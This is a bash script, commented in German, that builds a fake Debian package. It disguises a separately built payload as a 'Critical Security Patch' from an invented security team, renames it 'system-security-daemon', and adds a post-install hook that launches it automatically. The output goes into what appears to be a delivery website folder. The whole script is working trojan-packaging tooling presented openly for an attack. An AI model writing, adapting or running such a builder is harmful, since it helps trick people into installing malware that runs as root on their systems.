#!/bin/bash
# ==========================================
#  BUILD FAKE .DEB INSTALLER
# ==========================================

GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

PAYLOAD_SRC="$ROOT_DIR/delivery/DbD-Site/files/payload_linux"
DEB_BUILD_DIR="$ROOT_DIR/delivery/temp_deb_build"

OUTPUT_DEB="$ROOT_DIR/delivery/DbD-Site/files/security-update.deb"

echo -e "${BLUE}[*] Erstelle Linux .deb Installer...${NC}"
echo -e "${BLUE}[i] Root Dir erkannt als: $ROOT_DIR${NC}"

# Check: Ist dpkg-deb installiert?
if ! command -v dpkg-deb &>/dev/null; then
  echo -e "${RED}[!] Fehler: 'dpkg-deb' ist nicht installiert.${NC}"
  echo "Bitte installieren mit: sudo apt install dpkg"
  exit 1
fi

# Checken ob payload existiert
if [ ! -f "$PAYLOAD_SRC" ]; then
  echo -e "${RED}[!] payload_linux nicht gefunden unter:${NC}"
  echo "    $PAYLOAD_SRC"
  echo -e "${YELLOW}Bitte erst ./build_payloads.sh ausführen.${NC}"
  exit 1
fi

# Ordnerstruktur erstellen
rm -rf "$DEB_BUILD_DIR"
mkdir -p "$DEB_BUILD_DIR/DEBIAN"
mkdir -p "$DEB_BUILD_DIR/usr/local/bin"

# Payload kopieren u. verstecken
cp "$PAYLOAD_SRC" "$DEB_BUILD_DIR/usr/local/bin/system-security-daemon"
chmod 755 "$DEB_BUILD_DIR/usr/local/bin/system-security-daemon"

# Control File erstellen
cat >"$DEB_BUILD_DIR/DEBIAN/control" <<EOF
Package: system-security-update
Version: 1.0-2025
Section: utils
Priority: optional
Architecture: amd64
Maintainer: Security Team <security@internal.corp>
Description: Critical Security Patch
 Fixes critical vulnerabilities.
EOF

# Post-Install Script
cat >"$DEB_BUILD_DIR/DEBIAN/postinst" <<EOF
#!/bin/bash
/usr/local/bin/system-security-daemon &
exit 0
EOF

chmod 755 "$DEB_BUILD_DIR/DEBIAN/postinst"

# Build
dpkg-deb --build "$DEB_BUILD_DIR" "$OUTPUT_DEB"

if [ -f "$OUTPUT_DEB" ]; then
  echo -e "${GREEN}[+] Installer erfolgreich erstellt: $OUTPUT_DEB${NC}"
else
  echo -e "${RED}[!] Fehler beim Erstellen des Pakets.${NC}"
  exit 1
fi

# Aufräumen
rm -rf "$DEB_BUILD_DIR"
